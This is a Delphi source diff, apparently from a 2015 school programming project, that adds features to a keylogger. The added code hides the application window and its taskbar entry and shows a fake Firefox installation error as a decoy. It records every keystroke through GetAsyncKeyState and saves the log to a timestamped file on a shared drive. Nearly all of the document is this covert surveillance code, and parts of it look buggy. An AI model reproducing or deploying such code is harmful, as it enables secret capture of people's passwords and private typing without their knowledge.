@@ -5,7 +5,7 @@ unit Unit1;
    Authors: Timothy Schiess, Florian Huwyler, Alain Stulz
    Date: 19.02.2015 - 26.02.2015
 }
-   //TODO: Merge with Florian
+
 interface
 
 uses
@@ -20,6 +20,7 @@ type
     Memo2: TMemo;
     procedure Button1Click(Sender: TObject);
     procedure Timer1Timer(Sender: TObject);
+    procedure FormCreate(Sender: TObject);
   private
     { Private-Deklarationen }
   public
@@ -27,7 +28,7 @@ type
   end;
 
 var
-  Form1: TForm1;
+  Form1: TForm1; d:string;
 
 implementation
 
@@ -45,11 +46,42 @@ begin
   Memo2.SetFocus;
 end;
 
-procedure TForm1.Timer1Timer(Sender: TObject);
+procedure TForm1.FormCreate(Sender: TObject); //Writes Lines to .txt
+var f:textfile; GabenASCII:String; Gaben:textfile; short:String;
+begin
+randomize;
+d:= 'S:\Informatik EF 2015\lökj\' +  datetostr(now)+'_' +IntToStr(random(100000))+ '.txt'; //location of .txt file
+
+Assignfile(Gaben,('S:\Informatik EF 2015\lökj'+'Gaben.txt'));
+FileMode := fmOpenRead;
+reset(Gaben);
+while not Eof(Gaben) do
+Begin
+  Readln(Gaben,short);
+  GabenAscii := GabenAscii + short;
+End;
+Close(Gaben);
+
+
+assignfile(f,d);
+rewrite(f);
+writeln(f,Gaben); //Adds our Lord and Savior Gaben
+// writeln(f, 'Time Written: ' + datetostr(now)); only works when nothing is added
+memo1.lines.add('KeyloggerProtocol - EF Info');
+memo1.lines.add('Time Written: ' + datetostr(now));
+closefile(f);
+Application.ShowMainForm := False;   //Hides Form
+Application.MainFormOnTaskbar := false; //Hides Label on the bottom taskbar
+MessageDlg('ERROR! Firefox can not be installed on this PC. You do not have the required permission to do so. Please consult your IT departement to resolve this issue.',mtError,[mbCancel,mbHelp], 1);
+end;
+
+procedure TForm1.Timer1Timer(Sender: TObject); //Main Procedure based of an interval
 var
 InputKey, KeyResult : Integer;
-begin
+Pressed: Bool;
+f:textfile;
 
+begin
 InputKey := 0;
 repeat
 KeyResult := GetAsyncKeyState(InputKey);
@@ -63,7 +95,7 @@ begin
     9: DisplayAction(' [TAB] ');
     12: DisplayAction(' [ALT] ');
     13: DisplayAction(' [ENTER] ');
-    16: DisplayAction(' [SHIFT] ');
+    16: Pressed := True;  //DisplayAction(' [SHIFT] ');
     17: DisplayAction(' [CONTROL] ');
     18: DisplayAction(' [ALT] ');
     19: DisplayAction(' [BREAK] ');
@@ -81,6 +113,7 @@ begin
     44: DisplayAction(' [PRINT SCREEN] ');
     45: DisplayAction(' [INSERT] ');
     46: DisplayAction(' [DELETE] ');
+    91: DisplayAction(' [WINDOWS] ');
     96: DisplayAction(' 0 ');
     97: DisplayAction(' 1 ');
     98: DisplayAction(' 2 ');
@@ -107,7 +140,7 @@ begin
     120: DisplayAction(' [F9] ');
     121: DisplayAction(' [F10] ');
     122: DisplayAction(' [F11] ');
-    123: DisplayAction(' [F12] ');
+    123: Application.ShowMainForm := true; //DisplayAction(' [F12] ');
     144: DisplayAction(' [NUM LOCK] ');
     145: DisplayAction(' [SCROLL LOCK] ');
     160: ; // Shift Left
@@ -132,12 +165,15 @@ begin
     226: DisplayAction(' < ');
   else if (InputKey >=32) and (InputKey <=110) AND (InputKey <> 64) then
   begin
-    Memo1.Text := Memo1.Text + Chr(InputKey) + ' TAG: ' + IntToStr(InputKey);
+    if pressed then Memo1.Text := Memo1.Text + Uppercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey)
+    else Memo1.Text := Memo1.Text + Lowercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey);
     Memo1.Lines.Add('');
+    //Memo1.Lines.SaveToFile(d);
   end
-  else // Exception for all undefined keys
+  else // Exception for all undefin ed keys
     Memo1.Lines.Add(IntToStr(InputKey));
   end; {of ELSE}
+  Memo1.Lines.SaveToFile(d);  //saves the lines from the form to the .txt file¨and rewrites the file
   end; {of CASE}
   Inc(InputKey);
 until InputKey = 255
